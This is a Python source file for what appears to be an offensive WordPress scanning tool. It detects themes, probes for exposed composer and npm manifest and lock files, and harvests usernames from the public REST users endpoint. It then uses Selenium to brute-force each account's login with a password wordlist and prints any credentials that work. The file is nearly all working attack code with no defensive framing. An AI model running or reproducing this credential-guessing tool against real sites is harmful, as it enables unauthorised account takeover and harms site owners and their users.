from time import sleep
from selenium.webdriver.common.by import By
import os
import Classes.Browser as Browser
import requests
from alive_progress import alive_it


# Get the information for vulnerabilities or backdoors
def get_information(browser, url, html, scripts, styles, page, cookies):
    print('🔬 Get information')
    theme = False
    try_composer_root(url)
    theme_url = try_find_theme(styles, scripts)
    if theme_url:
        theme = get_theme(theme_url)
        try_composer_theme(theme_url)
        try_npm_theme(theme_url)

    if is_rest_normal(url):
        print('Wordpress default rest api 😈')
        get_versions(browser, url, html, scripts, styles, page)
        get_users(browser, url)
    else:
        print('Wordpress rest api not default')
    # Check the theme dir for enabled php logging backdoors
    # Try finding composer json / package.json for more information


# Check if root has composer.json
def try_composer_root(url):
    base_url = Browser.get_base_url(url)
    url = base_url + "/composer.json"
    response = requests.get(url)
    if not response.status_code == 200:
        return

    print('🔥 Composer root found! Did the developer make a backdoor for me?')
    print(url)

    url = base_url + "/composer.lock"
    response = requests.get(url)
    if not response.status_code == 200:
        return

    print('🔥 Composer.lock theme found! Did the developer make a backdoor for me?')
    print(url)


def try_composer_theme(base_url):
    url = base_url + "/composer.json"
    response = requests.get(url)
    if not response.status_code == 200:
        return

    print('🔥 Composer theme found! Did the developer make a backdoor for me?')
    print(url)
    url = base_url + "/composer.lock"
    response = requests.get(url)
    if not response.status_code == 200:
        return

    print('🔥 Composer.lock theme found! Did the developer make a backdoor for me?')
    print(url)


def try_npm_theme(base_url):
    url = base_url + "/package.json"

    response = requests.get(url)
    if not response.status_code == 200:
        return

    print('🔥 package.json theme found! Did the developer make a backdoor for me?')
    print(url)

    url = base_url + "/package-lock.json"
    response = requests.get(url)
    if response.status_code == 200:
        print('🔥 package-lock.json theme found! Did the developer make a backdoor for me?')
        print(url)

    url = base_url + "/yarn.lock"
    response = requests.get(url)
    if response.status_code == 200:
        print('🔥 yarn.lock theme found! Did the developer make a backdoor for me?')
        print(url)
    url = base_url + "/yarn.lock"
    response = requests.get(url)
    if response.status_code == 200:
        print('🔥 yarn.lock theme found! Did the developer make a backdoor for me?')
        print(url)

    url = base_url + "/pnpm-lock.yaml"
    response = requests.get(url)
    if response.status_code == 200:
        print('🔥 pnpm-lock.yaml theme found! Did the developer make a backdoor for me?')
        print(url)
    url = base_url + "/webpack.mix.js"
    response = requests.get(url)
    if response.status_code == 200:
        print('🔥 pnpm-lock.yaml theme found! Did the developer make a backdoor for me?')
        print(url)
    url = base_url + "/tailwind.config.js"
    response = requests.get(url)
    if response.status_code == 200:
        print('🔥 pnpm-lock.yaml theme found! Did the developer make a backdoor for me?')
        print(url)

    exit()


# Try to find theme by using scripts / styles
def try_find_theme(styles, scripts):
    if styles or scripts:
        if scripts:
            for script in scripts:
                if "/themes/" in script:
                    return get_theme_url(script)
        if styles:
            for style in styles:
                if "/themes/" in style:
                    return get_theme_url(style)
    return False


# get the theme url
def get_theme_url(url):
    print('🔥 Theme found!')
    url = url.partition('/themes/')[0] + '/themes/' + url.partition('/themes/')[2].partition('/')[0]
    print(url)
    return url


# Get the theme
def get_theme(url):
    theme = url.partition('/themes/')[2]
    print(theme)
    return theme


# Get versions of plugins
def get_versions(browser, url, html, scripts, styles, page):
    print('Get plugins and theme')
    # print(scripts)


# Get users
def get_users(browser, url):
    users = get_users_of_rest(url)
    if users:
        print('found users:')
        for user in users:
            print('====================')
            print('ID:')
            print(user['id'])
            print('Name:')
            print(user['name'])
            print('Slug/ Username:')
            print(user['slug'])
            print('====================')
            try_logging_in(browser, url, user['slug'])
    else:
        print('No users found someone is hiding routes.')


# Try logging in to WordPress
def try_logging_in(browser, url, username):
    browser.get(Browser.get_base_url(url) + "/wp-login.php")
    sleep(2)
    browser.find_element(By.ID, "user_login").send_keys(username)
    with open(os.path.abspath(os.getcwd()) + "/passwords.txt") as f_in:
        lines = list(line for line in (l.strip() for l in f_in) if line)
        print('Try passwords on users:')
        print(username)
        for line in alive_it(lines):
            browser.find_element(By.ID, "user_pass").send_keys(line)
            sleep(1)

            browser.find_element(By.ID, "wp-submit").click()

            sleep(2)
            if not Browser.check_exists_by_id(browser, "wp-submit"):
                print('Success!')
                print('Username: ' + username)
                print('Password: ' + line)
                break


# Get users of rest
def get_users_of_rest(url):
    response = requests.get(Browser.get_base_url(url) + "/wp-json/wp/v2/users")
    if not response.status_code == 200:
        return False
    return response.json()


# Is the rest endpoint default
def is_rest_normal(url):
    url = Browser.get_base_url(url) + "/wp-json/wp/v2/"
    response = requests.get(url)
    if not response.status_code == 200:
        return False
    data = response.json()
    if "routes" in data and "_links" in data:
        return True


# Are given assets from a wordpress
def is_wordpress(scripts, styles):
    is_a_wordpress = False
    if styles or scripts:
        if scripts:
            for script in scripts:
                if is_wordpress_asset(script):
                    return True
        if styles:
            for style in styles:
                if is_wordpress_asset(style):
                    return True

    return is_a_wordpress


# Is given asset a wordpress url
def is_wordpress_asset(url):
    if "/wp-content/" in url or "/wp-includes/" in url:
        return True
    else:
        return False
